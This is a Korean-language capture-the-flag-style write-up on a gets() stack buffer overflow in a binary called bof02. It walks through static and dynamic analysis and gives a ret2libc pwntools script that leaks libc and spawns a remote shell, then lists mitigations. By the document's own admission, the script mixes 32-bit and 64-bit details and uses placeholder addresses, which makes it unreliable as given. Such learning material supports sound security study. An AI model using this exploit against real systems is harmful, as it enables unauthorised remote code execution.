# 시스템 해킹 라이트업 — BOF02 (Stack Buffer Overflow)

---

## 1. 개요

BOF와 ret2libc의 정적 분석·디버깅·페이로드 구성 과정을 정리한 학습 문서다. 아래 환경 설명에는 32비트, 코드에는 p64와 pop_rdi를 쓰는 64비트 예시가 혼재한다. 원본 바이너리·실행 로그를 연결한 재현 완료 보고서로 보지 않는다.

---

## 2. 대상 / 환경

| 항목 | 내용 |
|------|------|
| 파일 | bof02 (ELF 32-bit) |
| 보호기법 | RELRO: Partial / Stack Canary: None / NX: Enabled / PIE: None |
| 환경 | Docker 컨테이너 (로컬) + 원격 서버 |
| 도구 | IDA Free 9.0, GDB + pwndbg, pwntools |

---

## 3. 정적 분석 — IDA Free

```c
// 디컴파일 결과 (의사 코드)
void vuln_func() {
    char buf[64];
    gets(buf);   // ← 크기 제한 없음 → BOF 취약
}

int main() {
    puts("Input: ");
    vuln_func();
    return 0;
}
```

**발견 사항**
- `gets()` 함수 사용 → 버퍼 크기 제한 없이 입력받음
- `buf` 크기: 64바이트
- NX 활성화 → 스택 실행 제한 → ret2libc 등 코드 재사용 방식 검토

---

## 4. 동적 분석 — GDB + pwndbg

```bash
gdb ./bof02

# 1. cyclic 패턴 생성 및 입력
(gdb) run < <(cyclic 200)

# 2. 크래시 확인 → EIP 값 확인
Program received signal SIGSEGV
EIP: 0x6161616e  ← cyclic 패턴

# 3. 오프셋 계산
(gdb) python3 -c "from pwn import *; print(cyclic_find(0x6161616e))"
76
```

**76바이트는 원문 예시 값**이다. 32비트의 saved EBP 크기와 64비트 페이로드를 혼합해 계산할 수 없으므로 실제 ELF와 cyclic 결과를 기준으로 다시 확인해야 한다.

---

## 5. 익스플로잇 전략 — ret2libc

```
NX 활성화 → 스택 실행 불가
PIE 비활성화 → 바이너리 주소 고정

전략: ret2libc
  1. puts() 또는 printf()로 libc 주소 누출
  2. libc base = 누출된 주소 - puts 오프셋
  3. system("/bin/sh") = libc base + system 오프셋
```

---

## 6. solve.py 참고 예시

이 코드는 주소 자리표시자와 64비트 패킹을 포함한다. 위 32비트 환경에 그대로 실행할 수 있는 완성 코드가 아니다. 호출 규약·ELF 비트수·가젯·오프셋을 먼저 맞춰야 한다.

```python
from pwn import *

# 설정
elf  = ELF("./bof02")
libc = ELF("./libc.so.6")   # 서버와 동일한 libc
p    = remote("HOST", PORT)

# 가젯 주소 (PIE 비활성화이므로 고정)
puts_plt  = elf.plt["puts"]
puts_got  = elf.got["puts"]
main_addr = elf.symbols["main"]
pop_rdi   = 0x[GADGET]       # ROPgadget으로 확인

offset = 76

# STAGE 1: libc 주소 누출
payload  = b"A" * offset
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(main_addr)   # main으로 복귀

p.sendlineafter("Input: ", payload)
leaked = u64(p.recvline().strip().ljust(8, b"\x00"))
libc.address = leaked - libc.symbols["puts"]
log.success(f"libc base: {hex(libc.address)}")

# STAGE 2: system("/bin/sh") 호출
bin_sh  = next(libc.search(b"/bin/sh"))
system  = libc.symbols["system"]
ret_gad = 0x[RET_GADGET]    # 스택 정렬용

payload2  = b"A" * offset
payload2 += p64(ret_gad)    # 16바이트 정렬
payload2 += p64(pop_rdi)
payload2 += p64(bin_sh)
payload2 += p64(system)

p.sendlineafter("Input: ", payload2)
p.interactive()
```

---

## 7. 영향도

- 원격 코드 실행 (RCE)
- 서버 셸 획득 → 내부 파일 접근 / 권한 상승 가능
- 실제 대상과 전제 조건을 재확인하지 않아 확정 CVSS 점수를 기재하지 않는다.

---

## 8. 대응 방안

```c
// 취약 코드
gets(buf);

// 방어 코드
fgets(buf, sizeof(buf), stdin);
```

- `gets()` 사용 금지 → `fgets()`, `read()` 사용
- 스택 카나리 활성화 (`-fstack-protector-all`)
- ASLR + PIE 동시 활성화
- NX 유지 (이미 적용 중)

---

## 9. 학습한 점

- ret2libc는 NX가 있어도 "라이브러리 함수"를 재활용하므로 우회 가능
- libc 누출 → base 계산 → 오프셋 더하기 흐름이 핵심 패턴
- 스택 정렬(16바이트) 문제로 `movaps` 오류 발생 시 `ret` 가젯 하나 추가로 해결
